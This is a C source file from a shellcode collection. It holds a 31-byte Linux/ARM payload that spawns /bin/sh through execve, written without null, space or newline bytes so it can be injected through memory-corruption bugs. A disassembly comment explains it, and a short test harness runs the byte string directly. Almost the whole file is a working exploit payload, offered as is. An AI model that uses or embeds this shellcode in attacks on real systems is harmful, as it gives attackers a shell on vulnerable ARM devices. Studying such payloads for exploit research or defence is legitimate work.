/*
Title:  Linux/ARM - execve("/bin/sh",NULL,0) - 31 bytes
Date:   2010-08-31
Tested: ARM926EJ-S rev 5 (v5l)
Author: Jonathan Salwan - twitter: @jonathansalwan
shell-storm.org

Shellcode ARM without 0x20, 0x0a and 0x00


00008054 <_start>:
    8054:	e28f3001 	add	r3, pc, #1	; 0x1
    8058:	e12fff13 	bx	r3
    805c:	4678      	mov	r0, pc
    805e:	300c      	adds	r0, #12
    8060:	46c0      	nop			(mov r8, r8)
    8062:	9001      	str	r0, [sp, #4]
    8064:	1a49      	subs	r1, r1, r1
    8066:	1a92      	subs	r2, r2, r2
    8068:	270b      	movs	r7, #11
    806a:	df01      	svc	1
    806c:	622f      	str	r7, [r5, #32]
    806e:	6e69      	ldr	r1, [r5, #100]
    8070:	732f      	strb	r7, [r5, #12]
    8072:	0068      	lsls	r0, r5, #1

*/


#include <stdio.h>


char *SC = 	"\x01\x30\x8f\xe2"
		"\x13\xff\x2f\xe1"
		"\x78\x46\x0c\x30"
		"\xc0\x46\x01\x90"
		"\x49\x1a\x92\x1a"
		"\x0b\x27\x01\xdf"
		"\x2f\x62\x69\x6e"
		"\x2f\x73\x68";

int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(SC));
        (*(void(*)()) SC)();
return 0;
}